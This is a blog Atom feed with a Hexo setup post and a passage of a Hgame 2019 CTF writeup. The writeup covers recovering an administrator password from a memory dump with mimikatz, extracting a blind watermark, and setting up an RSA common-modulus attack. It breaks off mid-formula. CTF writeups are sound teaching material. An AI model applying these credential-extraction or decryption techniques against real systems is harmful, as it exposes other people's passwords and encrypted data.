<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>离梦之殇</title>
  
  <subtitle>如梦之境</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.rainbowyang.moe/"/>
  <updated>2019-07-02T07:45:27.663Z</updated>
  <id>https://blog.rainbowyang.moe/</id>
  
  <author>
    <name>Rainbow Yang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于Hexo安装中的一些问题和方法</title>
    <link href="https://blog.rainbowyang.moe/post/Problems_in_Installing_Hexo.html"/>
    <id>https://blog.rainbowyang.moe/post/Problems_in_Installing_Hexo.html</id>
    <published>2019-07-01T10:11:14.000Z</published>
    <updated>2019-07-02T07:45:27.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="执行npm-install-hexo-cli-g后无反应"><a class="markdownIt-Anchor" href="#执行npm-install-hexo-cli-g后无反应"></a> 执行<code>npm install hexo-cli -g</code>后无反应</h2><p>解决方法是要把npm的仓库源换成国内的。</p><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h2 id="在hexo中使用katex的方法"><a class="markdownIt-Anchor" href="#在hexo中使用katex的方法"></a> 在Hexo中使用KaTeX的方法</h2><p>目前看下来最好的方法是使用<a href="https://github.com/thcd/hexo-katex" target="_blank" rel="noopener">hexo-katex</a>以及hexo-renderer-pandoc</p><p>操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br><span class="line"></span><br><span class="line">npm install hexo-katex --save</span><br></pre></td></tr></table></figure><p>并在<code>_config.yml</code>中加入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pandoc:</span><br><span class="line">  mathEngine: katex</span><br></pre></td></tr></table></figure><p>参考<a href="https://blog.masellum.me/2018/10/Hexo-Math-Katex/" target="_blank" rel="noopener">《为 Hexo 更换数学渲染引擎为 KaTeX》</a></p><h2 id="用hexo-abbrlink为博文绑定disqushexo主题-journal"><a class="markdownIt-Anchor" href="#用hexo-abbrlink为博文绑定disqushexo主题-journal"></a> 用hexo-abbrlink为博文绑定Disqus（Hexo主题 Journal）</h2><p>先安装<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a>.</p><p>然后将<code>\themes\journal\layout\_include\comment_includes.ejs</code>进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var disqus_config &#x3D; function () &#123;</span><br><span class="line">        this.page.url &#x3D; &#39;&lt;%&#x3D; config.url + config.root + page.path %&gt;&#39;;</span><br><span class="line">        this.page.identifier &#x3D; &#39;&lt;%&#x3D; page.abbrlink %&gt;&#39;; </span><br><span class="line">        &#x2F;&#x2F;&#39;&lt;%&#x3D; config.root + page.path %&gt;&#39;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;执行npm-install-hexo-cli-g后无反应&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#执行npm-install-hexo-cli-g后无反应&quot;&gt;&lt;/a&gt; 执行&lt;code&gt;npm install hexo-cli -g
      
    
    </summary>
    
    
      <category term="Blog" scheme="https://blog.rainbowyang.moe/categories/Blog/"/>
    
    
  </entry>
  
  <entry>
    <title>Writeup of Hgame 2019 Week4</title>
    <link href="https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week4.html"/>
    <id>https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week4.html</id>
    <published>2019-02-26T09:02:00.000Z</published>
    <updated>2020-07-15T03:58:05.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iv-misc"><a class="markdownIt-Anchor" href="#iv-misc"></a> Ⅳ MISC</h2><h3 id="1-warmup"><a class="markdownIt-Anchor" href="#1-warmup"></a> 1. Warmup</h3><h4 id="question"><a class="markdownIt-Anchor" href="#question"></a> Question</h4><p>Description</p><p>提交管理员密码的sha256，自己补上格式hgame{}</p><p>URL</p><p><a href="http://pmsw8b6r5.bkt.clouddn.com//ea72c72ba8808ccc22ca7f0fac63cfcb/1.zip" target="_blank" rel="noopener">http://pmsw8b6r5.bkt.clouddn.com//ea72c72ba8808ccc22ca7f0fac63cfcb/1.zip</a></p><p>Base Score</p><p>100</p><h4 id="answer"><a class="markdownIt-Anchor" href="#answer"></a> Answer</h4><p>这题主要就是用到了mimikatz</p><p>我把解压出来的1.gif改名成1.dmp</p><p><img src="/images/hgame-week4/mimikatz.png" alt="mimikatz" /></p><p>所以可以看到密码就是LOSER</p><p>SHA256就是<code>dd6dffcd56b77597157ac6c1beb514aa4c59d033098f806d88df89245824d3f5</code></p><p>所以flag就是<code>hgame{dd6dffcd56b77597157ac6c1beb514aa4c59d033098f806d88df89245824d3f5}</code></p><h3 id="3-暗藏玄机"><a class="markdownIt-Anchor" href="#3-暗藏玄机"></a> 3. 暗藏玄机</h3><h4 id="question-2"><a class="markdownIt-Anchor" href="#question-2"></a> Question</h4><p>Description</p><p>要开学了，要开学了（悲）</p><p>URL</p><p><a href="http://plqfgjy5a.bkt.clouddn.com/%E5%BC%80%E5%AD%A6.zip" target="_blank" rel="noopener">http://plqfgjy5a.bkt.clouddn.com/开学.zip</a></p><p>Base Score</p><p>150</p><h4 id="answer-2"><a class="markdownIt-Anchor" href="#answer-2"></a> Answer</h4><p>打开压缩包，里面是两张看上去一模一样的图片。</p><p>一开始我看了半天，并没有发现什么。</p><p>最后在py了学长之后拿到了hint：<code>盲水印</code></p><p>网上有现成地代码(<a href="https://github.com/YvesZHI/BlindWaterMark/blob/master/bwm.py" target="_blank" rel="noopener">https://github.com/YvesZHI/BlindWaterMark/blob/master/bwm.py</a>)</p><p>然后执行<code>python bwm.py decode 开学了.png 开学啦.png flag.png</code></p><p>就会得到一张图片<br /><img src="/images/hgame-week4/flag.png" alt="flag" /></p><p>所以flag就是<code>hgame{h1de_in_THE_p1Cture}</code></p><p>（说实话，真的很简单，对我来说，主要的困难就是python2和3之间不兼容的这个硬伤，以及所依赖的库安装不上去。。。）</p><h2 id="v-crypto"><a class="markdownIt-Anchor" href="#v-crypto"></a> Ⅴ CRYPTO</h2><h3 id="1-easy_rsa"><a class="markdownIt-Anchor" href="#1-easy_rsa"></a> 1. easy_rsa</h3><h4 id="question-3"><a class="markdownIt-Anchor" href="#question-3"></a> Question</h4><p>Description</p><p>m为17位十进制数，提交格式hgame{m}</p><p>URL</p><p><a href="http://pmuyzdinx.bkt.clouddn.com/1.txt" target="_blank" rel="noopener">http://pmuyzdinx.bkt.clouddn.com/1.txt</a></p><p>Base Score</p><p>200</p><h4 id="answer-3"><a class="markdownIt-Anchor" href="#answer-3"></a> Answer</h4><p>打开给的题目如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">e1:<span class="number">0x33240</span></span><br><span class="line">e2:<span class="number">0x3e4f</span></span><br><span class="line">n:<span class="number">0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9</span>\</span><br><span class="line">    f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329\</span><br><span class="line">    <span class="number">893</span>f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac\</span><br><span class="line">    <span class="number">5</span>dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7\</span><br><span class="line">    d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb119\</span><br><span class="line">    <span class="number">64970659</span>cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356\</span><br><span class="line">    <span class="number">854</span>eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97\</span><br><span class="line">    fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</span><br><span class="line">c1:<span class="number">0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9</span>\</span><br><span class="line">    a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c77\</span><br><span class="line">    <span class="number">0</span>ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2d\</span><br><span class="line">    a636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9\</span><br><span class="line">    e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618\</span><br><span class="line">    c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab870\</span><br><span class="line">    <span class="number">8</span>d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c\</span><br><span class="line">    <span class="number">72160675</span>d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</span><br><span class="line">c2:<span class="number">0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7</span>\</span><br><span class="line">    <span class="number">942214</span>dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c\</span><br><span class="line">    <span class="number">38031</span>d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cab\</span><br><span class="line">    f83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3\</span><br><span class="line">    cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe8\</span><br><span class="line">    <span class="number">9e3</span>f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9f\</span><br><span class="line">    cbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670\</span><br><span class="line">    <span class="number">946356</span>b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6\</span><br><span class="line">c1=pow(m, e1, n)</span><br><span class="line">c2=pow(m, e2, n)</span><br></pre></td></tr></table></figure><p>可以看到这里对m进行了两次同模加密，所以可以使用同模攻击</p><p>原理如下：(来自<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/#_6" target="_blank" rel="noopener">ctf-wiki</a>)</p><p>设两个用户的公钥分别为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">e_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">e_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，且两者互质。</p><p>明文消息为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>，密文分别为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c_1 = m^{e_1}\bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">c_2 = m^{e_2}\bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span></span></p><p>当攻击者截获 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">c_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">c_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 后，就可以恢复出明文。用扩展欧几里得算法求出 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>s</mi><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mn>1</mn><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">re_1+se_2=1\bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>的两个整数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span></span></span></span>，由此可得：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>c</mi><mn>1</mn><mi>r</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>s</mi></msubsup><mo>=</mo><msup><mi>m</mi><mrow><mi>r</mi><msub><mi>e</mi><mn>1</mn></msub></mrow></msup><msup><mi>m</mi><mrow><mi>s</mi><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>n</mi><mo>=</mo><msup><mi>m</mi><mrow><mo stretchy="false">(</mo><mi>r</mi><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>s</mi><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>n</mi><mo>=</mo><mi>m</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_1^r c_2^s = m^{re_1} m^{se_2}\bmod n =m^{(re_1+se_2)} \bmod n=m\bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9613919999999999em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">s</span><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose 